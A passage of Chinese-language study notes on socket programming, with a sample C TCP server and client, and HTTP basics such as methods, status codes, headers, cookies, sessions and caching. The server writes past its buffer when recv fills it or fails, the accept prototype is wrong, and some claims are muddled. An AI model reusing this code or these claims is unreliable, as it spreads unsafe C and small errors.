- `sockfd`：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字。
- `addr`：一个`const struct sockaddr *`指针，指向要绑定给`sockfd`的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同

- `addrlen`：对应的是地址的长度。

通常服务器在启动的时候都会绑定一个众所周知的地址（如`ip地址+端口号`），用于提供服务，客户就可以通过它来接连服务器；而客户端就不用指定，有系统自动分配一个`端口号和自身的ip地址`组合。这就是为什么通常**服务器端在listen之前会调用bind()**，而客户端就不会调用，而是在connect()时由系统随机生成一个。

### listen(),connect()函数

如果作为一个服务器，在调用`socket()`、`bind()`之后就会调用`listen()`来监听这个socket，如果客户端这时调用`connect()`发出连接请求，服务器端就会接收到这个请求。

```c++
int listen(int sockfd, int backlog);
int connect(int sockfd, const struct sockaddr* addr, socklen_t addrlen);
```

listen函数的参数：

- `sockfd`：即为要监听的socket描述字
- `backlog`：相应socket可以排队的最大连接个数。
- socket()函数创建的socket默认是一个主动类型的，listen函数将socket变为被动类型的，等待客户的连接请求。

connect函数的参数：

- `sockfd`：即为客户端的socket描述字
- `addr`：服务器的socket地址
- `addrlen`：socket地址的长度
- 客户端通过调用connect函数来建立与TCP服务器的连接。

### accept()函数

TCP服务器端依次调用`socket()`、`bind()`、`listen()`之后，就会监听指定的socket地址了。TCP客户端依次调用socket()、connect()之后就想TCP服务器发送了一个连接请求。TCP服务器监听到这个请求之后，就会调用accept()函数取接收请求，这样连接就建立好了。之后就可以开始网络I/O操作了，即类同于普通文件的读写I/O操作。

```c++
int accept(int sockfd, struct sockaddr* addr, socklen_t addrlen);
```

accept函数的参数：

- `sockfd`：服务器的socket描述字
- `addr`：指向`struct sockaddr *`的指针，用于返回客户端的协议地址
- `addrlen`：协议地址的长度

- 如果`accpet`成功，那么其返回值是由内核自动生成的一个**全新的描述字**，代表与返回客户的TCP连接。

**注意**：accept的第一个参数为服务器的socket描述字，是服务器开始调用socket()函数生成的，称为**监听socket描述字**；而accept函数返回的是已连接的socket描述字。一个服务器通常通常**仅仅只创建一个监听socket描述字**，它在该服务器的生命周期内一直存在。内核为每个由服务器进程接受的客户连接创建了一个已连接socket描述字，当服务器完成了对某个客户的服务，相应的已连接socket描述字就被关闭。

### read(),write()等函数

```c++
 ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags);
 ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
```

read函数是负责从`fd`中读取内容。当读成功时，read返回实际所读的字节数，如果返回的值是0表示已经读到文件的结束了，小于0表示出现了错误。如果错误为EINTR说明读是由中断引起的，如果是`ECONNREST`表示网络连接出了问题。

write函数将`buf`中的`nbytes`字节内容写入文件描述符`fd`。成功时返回写的字节数。失败时返回-1，并设置`errno`变量。 在网络程序中，当我们向套接字文件描述符写时有两种可能。

- write的返回值大于0，表示写了部分或者是全部的数据。
- 返回的值小于0，此时出现了错误。我们要根据错误类型来处理。如果错误为EINTR表示在写的时候出现了中断错误。如果为`EPIPE`表示网络连接出现了问题(对方已经关闭了连接)。

### close()函数

在服务器与客户端建立连接之后，会进行一些读写操作，完成了读写操作就要关闭相应的socket描述字，好比操作完打开的文件要调用`fclose`关闭打开的文件。

```c++
int close(int sockfd);
```

close一个TCP socket的缺省行为时把该socket标记为以关闭，然后立即返回到调用进程。该描述字不能再由调用进程使用，也就是说不能再作为read或write的第一个参数。

**注意**：close操作只是使相应socket描述字的引用计数-1，只有当引用计数为0的时候，才会触发TCP客户端向服务器发送终止连接请求。

## Socket中TCP的三次握手和四次挥手

### 三次握手

- 客户端向服务器发送一个`SYN J`
- 服务器向客户端响应一个`SYN K`，并对`SYN J`进行确认`ACK J+1`
- 客户端再想服务器发一个确认`ACK K+1`

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\socketconnect.png" alt="img" style="zoom:100%;" />
</div>


从图中可以看出：

- 当客户端调用`connect`时，触发了连接请求，向服务器发送了`SYN J`包，这时`connect`进入阻塞状态；
- 服务器监听到连接请求，即收到`SYN J`包，调用`accept`函数接收请求向客户端发送`SYN K` ，`ACK J+1`，这时`accept`进入阻塞状态；
- 客户端收到服务器的`SYN K` ，`ACK J+1`之后，这时`connect`返回，并对`SYN K`发送`ACK K+1`进行确认；
- 服务器收到`ACK K+1`时，`accept`返回，至此三次握手完毕，连接建立。

> 客户端的connect在三次握手的第二个次返回，而服务器端的accept在三次握手的第三次返回。

### 四次挥手

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\socketdisconnect.png" alt="img" style="zoom:100%;" />
</div>


- 某个应用进程首先调用`close`主动关闭连接，这时TCP发送一个`FIN M`；
- 另一端接收到`FIN M`之后，执行被动关闭，对这个FIN进行确认。它的接收也作为文件结束符传递给应用进程，因为FIN的接收意味着应用进程在相应的连接上再也接收不到额外数据；
- 一段时间之后，接收到文件结束符的应用进程调用close关闭它的socket。这导致它的TCP也发送一个`FIN N`；
- 接收到这个FIN的源发送端TCP对它进行确认。

## 一个socket使用例子

### 服务端

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define MAXLINE 4096

int main(){
    int listenfd, connfd;
    struct sockaddr_in servaddr;
    char buff[4096];
    int n;
    if((listenfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        printf("create socket error : %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(6666);

    if(bind(listenfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) == -1){
        printf("bind socket error: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }
    if(listen(listenfd, 10) == -1){
        printf("listen socket wrror: %s(errno: %d)\n", strerror(errno), errno);
        exit(0);
    }
    printf("-----------waiting for client's request----------------\n");
    while(1){
        if((connfd = accept(listenfd, (struct sockaddr*)NULL, NULL)) == -1){
            printf("accept socket error: %s(errno: %d)\n", strerror(errno), errno);
            continue;
        }
        n = recv(connfd, buff, MAXLINE, 0);
        buff[n] = '\0';
        printf("recv msg from client: %s\n", buff);
        close(connfd);
    }

    close(listenfd);

    return 0;
}
```

### 客户端

```c++
#include <stdio.h>
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAXLINE 4096

int main(int argc, char** argv)
{
        int    sockfd, n;
        char    recvline[4096], sendline[4096];
        struct sockaddr_in    servaddr;
        if( argc != 2){
                printf("usage: ./client <ipaddress>\n");
                exit(0);
        }

        if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                printf("create socket error: %s(errno: %d)\n", strerror(errno),errno);
                exit(0);
        }

        memset(&servaddr, 0, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(6666);
        if( inet_pton(AF_INET, argv[1], &servaddr.sin_addr) <= 0){
                printf("inet_pton error for %s\n",argv[1]);
                exit(0);
        }

        if( connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0){
                printf("connect error: %s(errno: %d)\n",strerror(errno),errno);
                exit(0);
        }

        printf("send msg to server: \n");
        fgets(sendline, 4096, stdin);
        if( send(sockfd, sendline, strlen(sendline), 0) < 0)
        {
                printf("send msg error: %s(errno: %d)\n", strerror(errno), errno);
                exit(0);
        }

        close(sockfd);
        exit(0);
        return 0;
}
```

# 计算机网络之HTTP

## 基础概念

### URI

URI（Uniform Resource Identifier，统一资源标识符）包含URL和URN：

- URL（Uniform Resource Locator，统一资源定位符）：例如`www.google.com`

- URN（Uniform Resource Name，统一资源名称）：例如`urn:isbn:1234556`

### 请求和响应报文

#### 请求报文

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\HTTP_RequestMessageExample.png" alt="img" style="zoom:100%;" />
</div>


#### 响应报文

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\HTTP_ResponseMessageExample.png" alt="img" style="zoom:90%;" />
</div>


## HTTP方法

客户端发送的**请求报文第一行为请求行**，包含了方法字段。

### GET：获取资源

当前网络中，绝大部分使用的都是GET方法

### HEAD：获取报文头部

和 GET 方法类似，但是不返回报文实体主体部分。

主要用于确认 URL 的有效性以及资源更新的日期时间等。

### POST：传输实体主体

POST 主要用来传输数据，而 GET 主要用来获取资源。

### PUT：上传文件

由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。

### PATCH：对资源进行部分修改

PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。

### DELETE：删除文件

与 PUT 功能相反，并且同样不带验证机制。

### OPTIONS：查询支持的方法

查询指定的 URL 能够支持的方法。

会返回 `Allow: GET, POST, HEAD, OPTIONS` 这样的内容。

### CONNECT：要求与代理服务器通信时建立隧道

使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\connect.png" alt="img" style="zoom:90%;" />
</div>


### TRACE：追踪路径

服务器会将通信路径返回给客户端。

发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。

通常不会使用 TRACE，并且它容易受到 XST 攻击（`Cross-Site Tracing`，跨站追踪）。

### GET和POST区别

#### 作用

- GET用于获取资源，POST用于传输实体主体

#### 参数

- GET的参数包含在URL里，POST参数存储在实体主体中
- GET参数只支持ASCII码，POST参数支持标准字符集
- GET参数有长度限制，POST没有限制
- GET参数会被完整保留在浏览器的历史记录中，POST的记录不会被保留

#### 安全

- 安全的HTTP方法不会改变服务器状态，也就是说是只读的
- GET方法是安全的，POST不是（安全的方法还有HEAD，OPTIONS，不安全的有PUT，DELETE）

#### 幂等性

- 幂等的HTTP方法指同样的请求被执行一次和连续执行很多次的效果是一样的，服务器状态也是一样的，换句话说，幂等方法不应该具有副作用。所有的安全方法都是幂等的。
- 正确实现的条件下：GET，HEAD，PUT，DELETE等方法都是幂等的，POST方法不是。

#### 可缓存

- GET请求会被浏览器主动缓存（还有HEAD），但是POST在多数情况下不缓存（PUT和DELETE不可缓存），除非浏览器设置

**以上可能不是正确的，可参考如下区别:**

**请求参数**：GET请求参数是通过URL传递的，多个参数以&连接，POST请求放在request body中。
**请求缓存**：GET请求会被缓存，而POST请求不会，除非手动设置。
**收藏为书签**：GET请求支持，POST请求不支持。
**安全性**：POST比GET安全，GET请求在浏览器回退时是无害的，而POST会再次请求。
**历史记录**：GET请求参数会被完整保留在浏览历史记录里，而POST中的参数不会被保留。
**编码方式**：GET请求只能进行url编码，而POST支持多种编码方式。
**对参数的数据类型**：GET只接受ASCII字符，而POST没有限制。

## HTTP状态码

服务器返回的 **响应报文** 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。

### 1xx信息

Information（信息性状态码）表示接收的请求正在处理

- **100 continue**：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。

### 2xx成功

success（成功状态码）请求正常处理完毕

- **200 OK**
- 201 Created：已创建，成功请求并创建了新的资源
- 202 Accepted：已接受，已经接受请求，但未完成处理
- **204 No Content**：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。
- **206 Partial Content** ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。

### 3xx重定向

- **301 Moved Permanently** ：永久性重定向
- **302 Found** ：临时性重定向
- **303 See Other** ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。
- 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。
- **304 Not Modified** ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。
- **307 Temporary Redirect** ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。

### 4xx客户端错误

- **400 Bad Request** ：请求报文中存在语法错误。
- **401 Unauthorized** ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。
- **403 Forbidden** ：请求被拒绝。
- **404 Not Found：**服务器无法根据客户端的请求找到资源

### 5xx服务器错误

- **500 Internal Server Error** ：服务器正在执行请求时发生错误。
- 501 Not Implemented：服务器不支持请求的功能，无法完成请求
- 502 Bad Gateway：作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到一个无效的响应
- **503 Service Unavailable** ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。
- 504 Gateway Time-out：充当网关或者代理的服务器，未及时从远端服务器获取请求
- 505 HTTP version not supported：服务器不支持请求的http协议的版本，无法完成处理

## HTTP首部

有四种类型的首部字段：通用首部字段、请求首部字段、响应首部字段、实体首部字段

### 通用首部字段

| 首部字段名        | 说明                                       |
| ----------------- | ------------------------------------------ |
| Cache-Control     | 控制缓存的行为                             |
| Connection        | 控制不再转发给代理的首部字段、管理持久连接 |
| Date              | 创建报文的日期时间                         |
| Pragma            | 报文指令                                   |
| Trailer           | 报文末端的首部一览                         |
| Transfer-Encoding | 指定报文主体的传输编码方式                 |
| Upgrade           | 升级为其他协议                             |
| Via               | 代理服务器的相关信息                       |
| Warning           | 错误通知                                   |

### 请求首部字段

| 首部字段名          | 说明                                            |
| ------------------- | ----------------------------------------------- |
| Accept              | 用户代理可处理的媒体类型                        |
| Accept-Charset      | 优先的字符集                                    |
| Accept-Encoding     | 优先的内容编码                                  |
| Accept-Language     | 优先的语言（自然语言）                          |
| Authorization       | Web 认证信息                                    |
| Expect              | 期待服务器的特定行为                            |
| From                | 用户的电子邮箱地址                              |
| Host                | 请求资源所在服务器                              |
| If-Match            | 比较实体标记（ETag）                            |
| If-Modified-Since   | 比较资源的更新时间                              |
| If-None-Match       | 比较实体标记（与 If-Match 相反）                |
| If-Range            | 资源未更新时发送实体 Byte 的范围请求            |
| If-Unmodified-Since | 比较资源的更新时间（与 If-Modified-Since 相反） |
| Max-Forwards        | 最大传输逐跳数                                  |
| Proxy-Authorization | 代理服务器要求客户端的认证信息                  |
| Range               | 实体的字节范围请求                              |
| Referer             | 对请求中 URI 的原始获取方                       |
| TE                  | 传输编码的优先级                                |
| User-Agent          | HTTP 客户端程序的信息                           |

### 响应首部字段

| 首部字段名         | 说明                         |
| ------------------ | ---------------------------- |
| Accept-Ranges      | 是否接受字节范围请求         |
| Age                | 推算资源创建经过时间         |
| ETag               | 资源的匹配信息               |
| Location           | 令客户端重定向至指定 URI     |
| Proxy-Authenticate | 代理服务器对客户端的认证信息 |
| Retry-After        | 对再次发起请求的时机要求     |
| Server             | HTTP 服务器的安装信息        |
| Vary               | 代理服务器缓存的管理信息     |
| WWW-Authenticate   | 服务器对客户端的认证信息     |

### 实体首部字段

| 首部字段名       | 说明                   |
| ---------------- | ---------------------- |
| Allow            | 资源可支持的 HTTP 方法 |
| Content-Encoding | 实体主体适用的编码方式 |
| Content-Language | 实体主体的自然语言     |
| Content-Length   | 实体主体的大小         |
| Content-Location | 替代对应资源的 URI     |
| Content-MD5      | 实体主体的报文摘要     |
| Content-Range    | 实体主体的位置范围     |
| Content-Type     | 实体主体的媒体类型     |
| Expires          | 实体主体过期的日期时间 |
| Last-Modified    | 资源的最后修改日期时间 |

## 长连接和短连接，session,cookie,缓存

### 连接管理

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-10\HTTP1_x_Connections.png" alt="img" style="zoom:60%;" />
</div>


#### 短连接和长连接

当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问的 HTML 页面资源，还会请求图片资源。如果每进行一次 HTTP 通信就要新建一个 TCP 连接，那么开销会很大。

长连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。

- 从 HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 `Connection : close`；
- 在 HTTP/1.1 之前默认是短连接的，如果需要使用长连接，则使用 `Connection : Keep-Alive`。

**Keep-Alive 和非 Keep-Alive 有什么区别？**

对于非 Keep-Alive 来说，必须为每一个请求的对象建立和维护一个全新的连接。对于每一个这样的连接，客户机和服务器都要分配 TCP 的缓冲区和变量，这给服务器带来的严重的负担，因为一台 Web 服务器可能同时服务于数以百计的客户机请求。在 Keep-Alive 方式下，服务器在响应后保持该 TCP 连接打开，在同一个客户机与服务器之间的后续请求和响应报文可通过相同的连接进行传送。甚至位于同一台服务器的多个 Web 页面在从该服务器发送给同一个客户机时，可以在单个持久 TCP 连接上进行。

然而，Keep-Alive 并不是没有缺点的，当长时间的保持 TCP 连接时容易导致系统资源被无效占用，若对 Keep-Alive 模式配置不当，将有可能比非 Keep-Alive 模式带来的损失更大。因此，我们需要正确地设置 keep-alive timeout 参数，当 TCP 连接在传送完最后一个 HTTP 响应，该连接会保持 keepalive_timeout 秒，之后就开始关闭这个链接。

**HTTP 长连接短连接使用场景是什么**

长连接多用于操作频繁，点对点的通讯，而且连接数不能太多情况。每个 TCP 连接都需要三步握手，这需要时间，如果每个操作都是先连接，再操作的话那么处理速度会降低很多， 所以每个操作完后都不断开，下次处理时直接发送数据包就 OK 了，不用建立 TCP 连接。例如： 数据库的连接用长连接， 如果用短连接频繁的通信会造成 socket 错误，而且频繁的 socket创建也是对资源的浪费。

而像 WEB 网站的 http 服务一般都用短链接，因为长连接对于服务端来说会耗费一定的 资源，而像 WEB 网站这么频繁的成千上万甚至上亿客户端的连接用短连接会更省一些资源， 如果用长连接，而且同时有成千上万的用户，如果每个用户都占用一个连接的话，那可想而知吧。所以并发量大，但每个用户无需频繁操作情况下需用短连接。

#### 流水线

默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。

流水线是在同一条长连接上连续发出请求，而不用等待响应返回，这样可以减少延迟。

### Cookie

HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。

Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发起请求时被携带上，用于告知服务端两个请求是否来自同一浏览器。由于之后每次请求都会需要携带 Cookie 数据，因此会带来额外的性能开销（尤其是在移动环境下）。

Cookie 曾一度用于客户端数据的存储，因为当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。

#### 用途

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

#### 创建过程

- 服务器发送的响应报文包含 Set-Cookie 首部字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。
- 客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。

```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

#### 分类

- 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
- 持久性 Cookie：指定过期时间（Expires）或有效期（max-age）之后就成为了持久性的 Cookie。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

#### 作用域

Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如 `developer.mozilla.org`）。

Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F ("/")` 作为路径分隔符，子路径也会被匹配。例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

#### JavaScript

浏览器通过 `document.cookie` 属性可创建新的 Cookie，也可通过该属性访问非 `HttpOnly` 标记的 Cookie。

```http
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
```

#### HttpOnly

标记为 `HttpOnly` 的 Cookie 不能被 JavaScript 脚本调用。跨站脚本攻击 (XSS) 常常使用 JavaScript 的 `document.cookie` API 窃取用户的 Cookie 信息，因此使用 `HttpOnly` 标记可以在一定程度上避免 XSS 攻击。

```http
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

#### Secure

标记为 Secure 的 Cookie **只能通过被 HTTPS 协议加密过的请求**发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。

### Session

除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。

Session 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 `Redis` 这种内存型数据库中，效率会更高。

使用 Session 维护用户登录状态的过程如下：

- 用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；
- 服务器验证该用户名和密码，如果正确则把用户信息存储到 `Redis` 中，它在 `Redis` 中的 Key 称为 Session ID；
- 服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；
- 客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 `Redis` 中取出用户信息，继续之前的业务操作。

应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。

#### 浏览器禁用cookie

此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是使用 URL 重写技术，**将 Session ID 作为 URL 的参数**进行传递。

### Session、Cookie和Token的主要区别

HTTP协议是无状态的，即服务器无法判断用户身份。Session和Cookie可以用来进行身份辨认。

- Cookie

  Cookie是保存在客户端一个小数据块，其中包含了用户信息。当客户端向服务端发起请求，服务端会像客户端浏览器发送一个Cookie，客户端会把Cookie存起来，当下次客户端再次请求服务端时，会携带上这个Cookie，服务端会通过这个Cookie来确定身份。

- Session

  Session是通过Cookie实现的，和Cookie不同的是，Session是存在服务端的。当客户端浏览器第一次访问服务器时，服务器会为浏览器创建一个sessionid，将sessionid放到Cookie中，存在客户端浏览器。比如浏览器访问的是购物网站，将一本《图解HTTP》放到了购物车，当浏览器再次访问服务器时，服务器会取出Cookie中的sessionid，并根据sessionid获取会话中的存储的信息，确认浏览器的身份是上次将《图解HTTP》放入到购物车那个用户。

- Token

  客户端在浏览器第一次访问服务端时，服务端生成的一串字符串作为Token发给客户端浏览器，下次浏览器在访问服务端时携带token即可无需验证用户名和密码，省下来大量的资源开销。看到这里很多人感觉这不是和sessionid作用一样吗？其实是不一样的，但是本文章主要针对面试，知识点很多，篇幅有限，几句话也解释不清楚，大家可以看看这篇文章，我觉得说的非常清楚。

  |         |   存放位置   | 占用空间 | 安全性 |      应用场景      |
  | :-----: | :----------: | :------: | :----: | :----------------: |
  | Cookie  | 客户端浏览器 |    小    |  较低  |  一般存放配置信息  |
  | Session |    服务端    |    多    |  较高  | 存放较为重要的信息 |

### 如果客户端禁止 cookie 能实现 session 还能用吗？

可以，Session的作用是在服务端来保持状态，通过sessionid来进行确认身份，但sessionid一般是通过Cookie来进行传递的。如果Cooike被禁用了，可以通过在URL中传递sessionid。

### Cookie与Session选择

- Cookie 只能存储 ASCII 码字符串，而 Session 则可以存储任何类型的数据，因此在**考虑数据复杂性时首选 Session**；
- Cookie 存储在浏览器中，**容易被恶意查看。**如果非要将一些隐私数据存在 Cookie 中，可以将 Cookie 值进行加密，然后在服务器进行解密；
- 对于大型网站，如果用户所有的信息都存储在 Session 中，那么**开销是非常大的**，因此不建议将所有的用户信息都存储到 Session 中。

### Token 和 Session 的区别

* Session 是一种**记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息**。而 Token 是**令牌**，**访问资源接口（API）时所需要的资源凭证**。Token **使服务端无状态化，不会存储会话信息。**

* Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。**如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。**

* 所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 SessionID 的不可预测性，暂且认为是安全的。而 Token ，如果指的是 OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对 App 。其目的是让某 App 有权利访问某用户的信息。这里的 Token 是唯一的。不可以转移到其它 App上，也不可以转到其它用户上。Session 只提供一种简单的认证，即只要有此 SessionID ，即认为有此 User 的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方 App。所以简单来说：**如果你的用户数据可能需要和第三方共享，或者允许第三方调用 API 接口，用 Token 。如果永远只是自己的网站，自己的 App，用什么就无所谓了。**

### 缓存

#### 优点

- 缓解服务器压力；
- 降低客户端获取资源的延迟：缓存通常位于内存中，读取缓存的速度更快。并且缓存服务器在地理位置上也有可能比源服务器来得近，例如浏览器缓存。

#### 实现方法

- 让代理服务器进行缓存；
- 让客户端浏览器进行缓存。

#### Cache-Control

Http/1.1通过`Cache-Control`首部字段来控制缓存

```http
Cache-Control: no-store
Cache-Control: no-cache
Cache-Control: private
Cache-Control: public
Cache-Control: max-age=31536000
Expires: Wed, 04 Jul 2012 08:26:05 GMT
```

- 禁止进行缓存：`no-store`指令规定不能对请求或响应的任何一部分进行缓存

- 强制确认缓存：`no-cache` 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。

- 私有缓存和公有缓存：`private` 指令规定了将资源作为私有缓存，只能被单独用户使用，一般存储在用户浏览器中。`public`指令规定了将资源作为公共缓存，可以被多个用户使用，一般存储在代理服务器中。
- 缓存过期机制：
  - `max-age`指令出现在请求报文，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。
  - `max-age` 指令出现在响应报文，表示缓存资源在缓存服务器中保存的时间。
  - `Expires` 首部字段也可以用于告知缓存服务器该资源什么时候会过期。
  - 在 `HTTP/1.1` 中，会优先处理 `max-age` 指令；
  - 在 `HTTP/1.0` 中，`max-age` 指令会被忽略掉。

#### 缓存验证

需要先了解 `ETag` 首部字段的含义，它是资源的唯一标识。URL 不能唯一表示资源，例如 `http://www.google.com/` 有中文和英文两个资源，只有 `ETag` 才能对这两个资源进行唯一标识。

```http
ETag: "82e22293907ce725faf67773957acd12"
```

可以将缓存资源的 `ETag` 值放入 `If-None-Match` 首部，服务器收到该请求后，判断缓存资源的 `ETag` 值和资源的最新 `ETag` 值是否一致，如果一致则表示缓存资源有效，返回 `304 Not Modified`。

```http
If-None-Match: "82e22293907ce725faf67773957acd12"
```

`Last-Modified` 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 `ETag` 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 `If-Modified-Since` 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 `200 OK`。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 `304 Not Modified` 响应报文。

```http
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
```

### 内容协商

通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。

#### 类型

- 服务端驱动型
  - 客户端设置特定的 HTTP 首部字段，例如 `Accept`、`Accept-Charset`、`Accept-Encoding`、`Accept-Language`，服务器根据这些字段返回特定的资源。
  - 它存在以下问题：
    - 服务器很难知道客户端浏览器的全部信息；
    - 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）；
    - 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。

- 代理驱动型
  - 服务器返回 `300 Multiple Choices` 或者 `406 Not Acceptable`，客户端从中选出最合适的那个资源。

#### Vary

```http
Vary: Accept-Language
```

在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。

例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 `Vary: Accept-Language` 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。

### 内容编码

内容编码将实体主体进行压缩，从而减少传输的数据量。

常用的内容编码有：`gzip`、`compress`、`deflate`、`identity`。

